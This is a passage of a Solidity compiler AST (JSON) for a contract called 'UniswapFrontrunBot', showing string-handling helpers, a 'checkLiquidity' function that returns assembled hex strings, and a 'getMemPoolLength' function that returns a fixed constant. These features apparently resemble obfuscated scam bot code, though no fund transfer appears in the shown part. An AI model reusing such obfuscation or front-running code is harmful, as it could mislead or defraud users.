															"nodeType": "VariableDeclarationStatement",
															"src": "10635:48:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1009,
																"name": "_hexC1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1000,
																"src": "10705:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"functionReturnParameters": 920,
															"id": 1010,
															"nodeType": "Return",
															"src": "10698:13:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1066,
															"name": "res",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 942,
															"src": "11142:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1065,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "11135:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1064,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "11135:6:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1067,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "11135:11:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 920,
												"id": 1068,
												"nodeType": "Return",
												"src": "11128:18:0"
											}
										]
									},
									"documentation": null,
									"id": 1070,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "checkLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 917,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 916,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1070,
												"src": "10163:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 915,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "10163:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10162:8:0"
									},
									"returnParameters": {
										"id": 920,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 919,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1070,
												"src": "10194:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 918,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "10194:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "10193:15:0"
									},
									"scope": 1680,
									"src": "10139:1015:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1077,
										"nodeType": "Block",
										"src": "11220:32:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "313635383731",
													"id": 1075,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "11238:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_165871_by_1",
														"typeString": "int_const 165871"
													},
													"value": "165871"
												},
												"functionReturnParameters": 1074,
												"id": 1076,
												"nodeType": "Return",
												"src": "11231:13:0"
											}
										]
									},
									"documentation": null,
									"id": 1078,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolLength",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1071,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "11188:2:0"
									},
									"returnParameters": {
										"id": 1074,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1073,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1078,
												"src": "11214:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1072,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11214:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11213:6:0"
									},
									"scope": 1680,
									"src": "11163:89:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1127,
										"nodeType": "Block",
										"src": "11627:592:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1091,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1087,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1080,
															"src": "11642:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 1088,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "11642:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1089,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1082,
															"src": "11654:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 1090,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "11654:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "11642:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1095,
												"nodeType": "IfStatement",
												"src": "11638:67:0",
												"trueBody": {
													"id": 1094,
													"nodeType": "Block",
													"src": "11667:38:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1092,
																"name": "self",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1080,
																"src": "11689:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																	"typeString": "struct UniswapFrontrunBot.slice memory"
																}
															},
															"functionReturnParameters": 1086,
															"id": 1093,
															"nodeType": "Return",
															"src": "11682:11:0"
														}
													]
												}
											},
											{
												"assignments": [
													1097
												],
												"declarations": [
													{
														"constant": false,
														"id": 1097,
														"mutability": "mutable",
														"name": "equal",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1127,
														"src": "11718:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1096,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "11718:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1099,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 1098,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "11731:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11718:17:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1104,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1100,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1080,
															"src": "11750:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 1101,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 38,
														"src": "11750:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1102,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1082,
															"src": "11763:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 1103,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 38,
														"src": "11763:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "11750:24:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1107,
												"nodeType": "IfStatement",
												"src": "11746:327:0",
												"trueBody": {
													"id": 1106,
													"nodeType": "Block",
													"src": "11776:297:0",
													"statements": [
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "11800:262:0",
																"statements": [
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11819:27:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "needle",
																					"nodeType": "YulIdentifier",
																					"src": "11839:6:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11833:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11833:13:0"
																		},
																		"variables": [
																			{
																				"name": "length",
																				"nodeType": "YulTypedName",
																				"src": "11823:6:0",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11864:37:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "self",
																							"nodeType": "YulIdentifier",
																							"src": "11889:4:0"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "11895:4:0",
																							"type": "",
																							"value": "0x20"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "11885:3:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11885:15:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11879:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11879:22:0"
																		},
																		"variables": [
																			{
																				"name": "selfptr",
																				"nodeType": "YulTypedName",
																				"src": "11868:7:0",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulVariableDeclaration",
																		"src": "11919:41:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "needle",
																							"nodeType": "YulIdentifier",
																							"src": "11946:6:0"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "11954:4:0",
																							"type": "",
																							"value": "0x20"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "11942:3:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11942:17:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "11936:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11936:24:0"
																		},
																		"variables": [
																			{
																				"name": "needleptr",
																				"nodeType": "YulTypedName",
																				"src": "11923:9:0",
																				"type": ""
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "11978:69:0",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "selfptr",
																							"nodeType": "YulIdentifier",
																							"src": "12000:7:0"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "12009:6:0"
																						}
																					],
																					"functionName": {
																						"name": "keccak256",
																						"nodeType": "YulIdentifier",
																						"src": "11990:9:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "11990:26:0"
																				},
																				{
																					"arguments": [
																						{
																							"name": "needleptr",
																							"nodeType": "YulIdentifier",
																							"src": "12028:9:0"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "12039:6:0"
																						}
																					],
																					"functionName": {
																						"name": "keccak256",
																						"nodeType": "YulIdentifier",
																						"src": "12018:9:0"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "12018:28:0"
																				}
																			],
																			"functionName": {
																				"name": "eq",
																				"nodeType": "YulIdentifier",
																				"src": "11987:2:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "11987:60:0"
																		},
																		"variableNames": [
																			{
																				"name": "equal",
																				"nodeType": "YulIdentifier",
																				"src": "11978:5:0"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 1097,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11978:5:0",
																	"valueSize": 1
																},
																{
																	"declaration": 1082,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11839:6:0",
																	"valueSize": 1
																},
																{
																	"declaration": 1082,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11946:6:0",
																	"valueSize": 1
																},
																{
																	"declaration": 1080,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "11889:4:0",
																	"valueSize": 1
																}
															],
															"id": 1105,
															"nodeType": "InlineAssembly",
															"src": "11791:271:0"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1108,
													"name": "equal",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1097,
													"src": "12090:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1124,
												"nodeType": "IfStatement",
												"src": "12086:101:0",
												"trueBody": {
													"id": 1123,
													"nodeType": "Block",
													"src": "12097:90:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1114,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1109,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1080,
																		"src": "12112:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																			"typeString": "struct UniswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 1111,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 36,
																	"src": "12112:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "-=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1112,
																		"name": "needle",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1082,
																		"src": "12125:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																			"typeString": "struct UniswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 1113,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 36,
																	"src": "12125:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "12112:24:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1115,
															"nodeType": "ExpressionStatement",
															"src": "12112:24:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1121,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1116,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1080,
																		"src": "12151:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																			"typeString": "struct UniswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 1118,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_ptr",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 38,
																	"src": "12151:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1119,
																		"name": "needle",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1082,
																		"src": "12164:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																			"typeString": "struct UniswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 1120,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 36,
																	"src": "12164:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "12151:24:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1122,
															"nodeType": "ExpressionStatement",
															"src": "12151:24:0"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1125,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1080,
													"src": "12207:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
														"typeString": "struct UniswapFrontrunBot.slice memory"
													}
												},
												"functionReturnParameters": 1086,
												"id": 1126,
												"nodeType": "Return",
												"src": "12200:11:0"
											}
										]
									},
									"documentation": null,
									"id": 1128,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "beyond",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1083,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1080,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1128,
												"src": "11550:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1079,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "11550:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1082,
												"mutability": "mutable",
												"name": "needle",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1128,
												"src": "11569:19:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1081,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "11569:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11549:40:0"
									},
									"returnParameters": {
										"id": 1086,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1085,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1128,
												"src": "11613:12:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
													"typeString": "struct UniswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1084,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 39,
													"src": "11613:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$39_storage_ptr",
														"typeString": "struct UniswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11612:14:0"
									},
									"scope": 1680,
									"src": "11534:685:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1249,
										"nodeType": "Block",
										"src": "12486:1309:0",
										"statements": [
											{
												"assignments": [
													1142
												],
												"declarations": [
													{
														"constant": false,
														"id": 1142,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1249,
														"src": "12497:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1141,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12497:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1144,
												"initialValue": {
													"argumentTypes": null,
													"id": 1143,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1132,
													"src": "12508:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "12497:18:0"
											},
											{
												"assignments": [
													1146
												],
												"declarations": [
													{
														"constant": false,
														"id": 1146,
														"mutability": "mutable",
														"name": "idx",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1249,
														"src": "12526:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1145,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12526:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1147,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "12526:8:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1150,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1148,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1134,
														"src": "12552:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1149,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1130,
														"src": "12565:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "12552:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1244,
												"nodeType": "IfStatement",
												"src": "12548:1205:0",
												"trueBody": {
													"id": 1243,
													"nodeType": "Block",
													"src": "12574:1179:0",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1153,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1151,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1134,
																	"src": "12593:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 1152,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12606:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "12593:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 1241,
																"nodeType": "Block",
																"src": "13263:479:0",
																"statements": [
																	{
																		"assignments": [
																			1210
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1210,
																				"mutability": "mutable",
																				"name": "hash",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1241,
																				"src": "13332:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1209,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "13332:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1211,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "13332:12:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "13372:43:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "13374:39:0",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "13392:9:0"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "13403:9:0"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "13382:9:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "13382:31:0"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "13374:4:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1210,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "13374:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1134,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "13403:9:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1136,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "13392:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 1212,
																		"nodeType": "InlineAssembly",
																		"src": "13363:52:0"
																	},
																	{
																		"body": {
																			"id": 1239,
																			"nodeType": "Block",
																			"src": "13485:242:0",
																			"statements": [
																				{
																					"assignments": [
																						1226
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1226,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nodeType": "VariableDeclaration",
																							"overrides": null,
																							"scope": 1239,
																							"src": "13508:16:0",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 1225,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "13508:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
